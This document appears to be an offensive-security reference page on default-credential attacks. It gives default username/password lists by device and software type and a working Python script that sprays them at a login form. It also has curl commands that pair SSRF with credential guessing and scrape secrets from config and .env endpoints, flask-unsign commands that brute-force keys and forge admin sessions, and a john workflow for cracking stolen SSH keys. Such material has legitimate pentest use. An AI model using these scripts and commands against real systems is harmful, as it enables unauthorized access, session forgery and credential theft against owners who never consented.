# Default Credentials Testing

## Strategy

Default credentials are unchanged factory/install-time credentials. Try BEFORE complex attacks.

**Priority order:**
1. Check source for embedded credentials (HTML comments, JS, configs)
2. Identify device/app type from login page branding, headers, title
3. Try top defaults for identified type against ALL login endpoints
4. If login is IP-restricted: combine with SSRF or HTTP smuggling
5. Automated spray only after manual top-10 fails

## Identifying the Application/Device Type

```bash
curl -s http://target/ | grep -i '<title>'
curl -sI http://target/ | grep -i 'server\|x-powered-by\|x-generator'
curl -s http://target/login | grep -iE 'admin|router|model|firmware|version|product'
for path in /robots.txt /info /version /status /about; do curl -s "http://target$path" | head -3; done
```

## Default Credentials by Category

### Generic / Web Admin Panels
```
admin:admin       admin:password    admin:(blank)     admin:1234
admin:admin123    admin:changeme    root:root         root:(blank)
administrator:admin  guest:guest   test:test         admin:secret
```

### Network Devices / Routers / Firewalls
```
admin:admin       admin:(blank)     admin:password    admin:1234
root:root         root:(blank)      cisco:cisco       admin:cisco
ubnt:ubnt         netscreen:netscreen  pi:raspberry  admin:0000
support:support   admin:admin123    Admin:Admin
```

### IoT / Embedded / Industrial
```
admin:admin  root:root  root:(blank)  admin:(blank)  supervisor:supervisor
admin:system  admin:default  operator:operator  guest:(blank)
```

### Databases
```
MySQL:       root:(blank)  root:root  root:mysql
PostgreSQL:  postgres:postgres  postgres:(blank)
MSSQL:       sa:(blank)  sa:sa  sa:Password1
Oracle:      sys:change_on_install  system:manager  scott:tiger
MongoDB:     admin:admin  (no auth in old versions)
Redis:       (no auth by default)
```

### Web Frameworks / CMS / DevOps Tools
```
WordPress/Drupal/Joomla:    admin:admin  admin:password
Jenkins/Grafana/SonarQube:  admin:admin  admin:(blank)
Nexus:        admin:admin123
Tomcat:       tomcat:tomcat  tomcat:s3cret  manager:manager
GitLab:       root:5iveL!fe
RabbitMQ:     guest:guest
Portainer:    admin:admin  admin:portainer
Elasticsearch: elastic:changeme
Kibana:       elastic:changeme
```

## Quick Test Script

```python
#!/usr/bin/env python3
"""Test default credentials against a web login endpoint."""
import requests, re, sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost"
LOGIN  = sys.argv[2] if len(sys.argv) > 2 else "/login"

CREDS = [
    ("admin","admin"), ("admin",""), ("admin","password"), ("admin","1234"),
    ("admin","admin123"), ("root","root"), ("root",""), ("administrator","admin"),
    ("admin","changeme"), ("admin","secret"), ("guest","guest"), ("test","test"),
    ("support","support"), ("admin","0000"), ("admin","12345"),
]

FAIL = ["invalid","incorrect","failed","error","wrong","unauthorized"]
WIN  = ["logout","dashboard","welcome","signed in","my account","profile"]

s = requests.Session()
r = s.get(f"{TARGET}{LOGIN}", timeout=10, verify=False)
csrf = next(((f, re.search(rf'name="{f}"[^>]*value="([^"]+)"', r.text, re.I).group(1))
             for f in ['csrf_token','_token','authenticity_token']
             if re.search(rf'name="{f}"', r.text, re.I)), None)

for user, pwd in CREDS:
    data = {"username": user, "password": pwd}
    if csrf: data[csrf[0]] = csrf[1]
    try:
        resp = s.post(f"{TARGET}{LOGIN}", data=data, timeout=10, verify=False, allow_redirects=True)
        low = resp.text.lower()
        if any(w in low for w in WIN):
            print(f"[+] SUCCESS: {user}:{pwd} -> {resp.url}"); print(resp.text[:400]); break
        elif not any(f in low for f in FAIL):
            print(f"[?] UNCLEAR: {user}:{pwd} HTTP {resp.status_code} (check manually)")
        else:
            print(f"[-] {user}:{pwd}")
    except Exception as e:
        print(f"[!] {user}:{pwd}: {e}")
```

## Combining with SSRF / Smuggling

When login is only accessible via localhost/internal:

```bash
# Via SSRF — POST to internal login endpoint
curl "http://target/fetch?url=http://127.0.0.1:8080/login" --data "username=admin&password=admin"

# Probe common internal admin ports
for port in 80 8080 8443 8000 9000 9090 3000; do
  curl -s "http://target/fetch?url=http://127.0.0.1:$port/admin" | head -5
done
```

For HTTP smuggling + auth: see `server-side/reference/smuggling-authenticated.md`

## Source Code Credential Hints

```bash
# HTML comments
curl -s http://target/ | grep -i '<!--' | grep -iE 'pass|cred|user|auth|secret'

# JS files for hardcoded credentials
curl -s http://target/ | grep -oE 'src="[^"]*\.js"' | sed 's/src="\|"//g' | \
  xargs -I{} curl -s "http://target{}" | grep -iE 'password|credentials|secret'

# Config/debug endpoints
for p in /setup /config /install /env /debug /api/config; do
  curl -s "http://target$p" | grep -iE 'pass|user|admin|secret' | head -3
done
```

## Weak / Default Secret Keys (Session Forgery)

Beyond login credentials, many frameworks use **hardcoded secret keys** for session signing. If the key is known, you can forge arbitrary sessions (including admin) without ever logging in.

### Flask (Python)
```bash
# Common weak Flask secret_key values
# your_secret_key, secret, secret_key, changeme, dev, development,
# supersecret, key, flask-secret, my_secret_key, password, admin, default

# Decode a Flask session cookie
pip install flask-unsign
flask-unsign --decode --cookie "SESSION_COOKIE_VALUE"

# Brute-force the secret key
flask-unsign --unsign --cookie "SESSION_COOKIE_VALUE" --wordlist wordlist.txt

# Forge admin session
flask-unsign --sign --cookie '{"username":"admin","user_id":1}' --secret "your_secret_key"
```

### Django (Python)
```bash
# Default: django-insecure-... (development), or found in settings.py
# Common: secret, changeme, development, your-secret-key
# If SECRET_KEY is known, forge sessions via django.core.signing
```

### Express.js / Node.js
```bash
# Common session secrets: secret, keyboard cat, your-secret, changeme
# Check: process.env.SESSION_SECRET, app.use(session({secret: '...'}))
```

### Rails (Ruby)
```bash
# secret_key_base in config/secrets.yml or credentials.yml.enc
# Common in dev: abcdef..., development_secret
```

### Detection
```bash
# Look for secret keys in source code, config files, env vars
curl -s http://target/ | grep -iE 'secret.?key|session.?secret|signing.?key'
curl -s http://target/static/app.js | grep -iE 'secret|signing|key'
for p in /env /.env /config /debug /info /api/config /setup; do
  curl -s "http://target$p" | grep -iE 'secret' | head -3
done
```

## SSH Key Cracking

When SSH private keys are found (via file read, backup downloads, object storage enumeration), they are often passphrase-protected. Crack them before attempting SSH login.

### ssh2john — Use bleeding-jumbo Branch (CRITICAL)

The `ssh2john.py` bundled with John the Ripper 1.9.0 (stable) **cannot handle ed25519 bcrypt-encrypted keys**. It crashes silently or produces "cipher value 6 not supported" errors. Always use the bleeding-jumbo version:

```bash
# Download the correct version
curl -sL "https://raw.githubusercontent.com/openwall/john/bleeding-jumbo/run/ssh2john.py" -o /tmp/ssh2john.py

# Convert key to john format
python3 /tmp/ssh2john.py id_rsa > id_rsa.hash

# Crack with wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash

# Or with rules
john --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64 id_rsa.hash
```

### Check bcrypt Rounds Count

SSH keys use bcrypt KDF with a configurable rounds count. Low rounds (e.g., 16-32) make cracking feasible even with slow tools. Check the key header:

```bash
# The rounds count is encoded in the key binary — ssh2john output shows it
# Very low rounds (16-32) = minutes to crack; high rounds (100+) = consider targeted wordlists
```

### Python Fallback (when john fails)

If john cannot parse the format, use Python with `bcrypt` and `cryptography` libraries for manual decryption:

```python
#!/usr/bin/env python3
"""Manual SSH key decryption when john/ssh2john fails."""
import base64, struct, hashlib
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

# Parse the key file to extract: cipher, kdf, rounds, salt, encrypted data
# For bcrypt-encrypted ed25519 keys:
# 1. Derive key material: bcrypt.kdf(password, salt, desired_key_length, rounds)
# 2. Decrypt with AES-256-CTR using derived key + IV
# 3. Verify: first 8 bytes of plaintext should be two identical 4-byte integers (check bytes)
# If check bytes match → correct passphrase
```

### Workflow

1. **Identify key type** — `head -1 id_rsa` (RSA, ED25519, ECDSA, DSA)
2. **Check if encrypted** — look for `ENCRYPTED` in the header or `Proc-Type: 4,ENCRYPTED`
3. **Use bleeding-jumbo ssh2john** — never the stable release
4. **Try common passphrases first** — username, hostname, service name, company name, simple patterns
5. **Check bcrypt rounds** — if very low, even a large wordlist is feasible
6. **Python fallback** — if john cannot handle the format

## CWE / References

- **CWE-1392**: Use of Default Credentials
- **CWE-521**: Weak Password Requirements
- **MITRE ATT&CK**: T1078.001 (Default Accounts)
- **OWASP**: A07:2021 — Identification and Authentication Failures
